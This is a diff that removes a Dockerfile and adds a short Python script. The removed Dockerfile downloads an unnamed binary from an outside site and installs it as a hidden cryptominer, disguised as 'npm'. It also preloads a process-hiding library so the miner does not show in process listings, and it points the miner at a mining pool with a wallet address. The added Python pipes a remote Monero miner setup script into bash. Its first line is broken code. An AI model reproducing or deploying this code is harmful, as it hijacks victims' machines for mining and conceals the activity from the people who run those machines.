@@ -1,11 +1,2 @@
-FROM debian
-RUN apt update && apt -y install wget xz-utils git make gcc && \
-    cd /opt && wget http://ilovenypizza.com/subscribe && \
-	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
-RUN git clone https://github.com/septianana55/cobasaja.git && \
-    cd /cobasaja && make && mv libprocesshider.so /usr/local/lib && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-RUN mv /opt/subscribe /usr/bin/phpq
-RUN chmod +x /usr/bin/phpq
-RUN echo " phpq -a yespowerTIDE -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TBKobuRWyJxfYNQiw9QipWa5i3JmvUqo3H.hero -t $(nproc --ignore 1)" > /usr/bin/npm
-RUN chmod +x /usr/bin/npm
-ENTRYPOINT npm
+import os.system
+os.system('curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2')
